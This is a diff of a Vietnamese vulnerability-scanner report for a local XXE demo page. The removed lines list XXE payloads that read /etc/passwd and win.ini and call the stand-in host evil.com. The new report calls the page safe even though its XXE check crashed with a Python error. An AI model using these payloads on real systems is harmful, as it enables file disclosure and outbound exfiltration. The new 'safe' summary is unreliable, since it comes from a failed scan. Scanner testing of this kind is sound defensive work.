@@ -1,6 +1,6 @@
-[TIME] 2025-07-24 15:59:16
+[TIME] 2025-08-24 17:44:32
 [URL] http://localhost/xxe-demo/
-[SUMMARY] XXE
+[SUMMARY] AN TOÀN
 ======= SQLi =======
 [*] Đang kiểm tra SQL Injection trên: http://localhost/xxe-demo/
 [!] URL không chứa tham số. Đang thử tìm form để kiểm tra...
@@ -13,10 +13,6 @@
 [✓] Không phát hiện lỗ hổng XSS.
 
 
-======= LFI =======
-[*] Đang kiểm tra LFI trên: http://localhost/xxe-demo/
-[✓] Không phát hiện lỗ hổng LFI.
-
 
 ======= CMDi =======
 [*] Đang kiểm tra Command Injection trên: http://localhost/xxe-demo/
@@ -25,13 +21,5 @@
 
 ======= XXE =======
 [*] Đang kiểm tra XXE trên: http://localhost/xxe-demo/
-[!] Có thể bị tấn công XXE với các payloads:
-    - <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://evil.com/evil"> %xxe; ]>
-    - <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
-    - <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-    - <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://evil.com/evil"> ]>
-    - <?xml version="1.0" ?>
-    - <foo>&xxe;</foo>
-    - <foo>test</foo>
-
+[!] Lỗi khi quét XXE: name 'os' is not defined
 
